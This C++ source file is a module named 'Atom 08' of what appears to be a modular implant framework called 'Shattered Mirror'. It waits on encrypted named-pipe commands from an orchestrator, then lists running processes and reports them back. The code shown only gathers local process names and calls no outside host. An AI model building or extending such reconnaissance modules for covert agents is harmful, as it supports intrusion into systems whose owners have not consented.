/*=============================================================================
 * Shattered Mirror v1 — Atom 08: Process Information
 * OPTION B: Dual pipes – receives commands on command pipe,
 *            sends reports on report pipe.
 *===========================================================================*/

#include "Atom_08_Proc.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <string>
#include <tlhelp32.h>

/* Debug logging to C:\Users\Public\proc_debug.txt */
static void ProcDebug(const char *format, ...) {
  char buf[512];
  va_list args;
  va_start(args, format);
  vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  FILE *f = fopen("log\\proc_debug.txt", "a");
  if (f) {
    fprintf(f, "%s\n", buf);
    fclose(f);
  }
}

DWORD WINAPI ProcessAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  ProcDebug("Atom 8 started. ID: %lu", dwAtomId);

  // 1. Connect to command pipe (receive commands)
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe) {
    ProcDebug("IPC_ConnectToCommandPipe failed");
    return 1;
  }

  // 2. Connect to report pipe (send reports)
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    ProcDebug("IPC_ConnectToReportPipe failed");
    CloseHandle(hCmdPipe);
    return 1;
  }

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  // Send CMD_READY on report pipe
  IPC_MESSAGE readyMsg = {0};
  readyMsg.dwSignature = 0x534D4952;
  readyMsg.CommandId = CMD_READY;
  readyMsg.dwPayloadLen = 0;
  IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);
  ProcDebug("Sent CMD_READY");

  // Wait a moment for pipe to stabilize
  Sleep(200);

  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          ProcDebug("Received CMD_EXECUTE. Enumerating processes...");

          HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
          if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(PROCESSENTRY32W);

            std::string procReport = "[PROC_LIST]\n";
            if (Process32FirstW(hSnapshot, &pe)) {
              do {
                char line[512];
                sprintf_s(line, "PID: %6d | %ls\n", pe.th32ProcessID,
                          pe.szExeFile);
                procReport += line;
                if (procReport.length() > 3800)
                  break;
              } while (Process32NextW(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);

            IPC_MESSAGE outMsg = {0};
            outMsg.dwSignature = 0x534D4952;
            outMsg.CommandId = CMD_REPORT;
            outMsg.dwPayloadLen = (DWORD)procReport.length();
            memcpy(outMsg.Payload, procReport.c_str(), outMsg.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);

            ProcDebug("Process list sent (%lu bytes)", outMsg.dwPayloadLen);
          } else {
            ProcDebug("CreateToolhelp32Snapshot failed");
          }
          // Do not break; stay alive for subsequent commands
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          ProcDebug("Received CMD_TERMINATE. Exiting.");
          break;
        }
      }
    }
    Sleep(100);
  }

  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  return 0;
}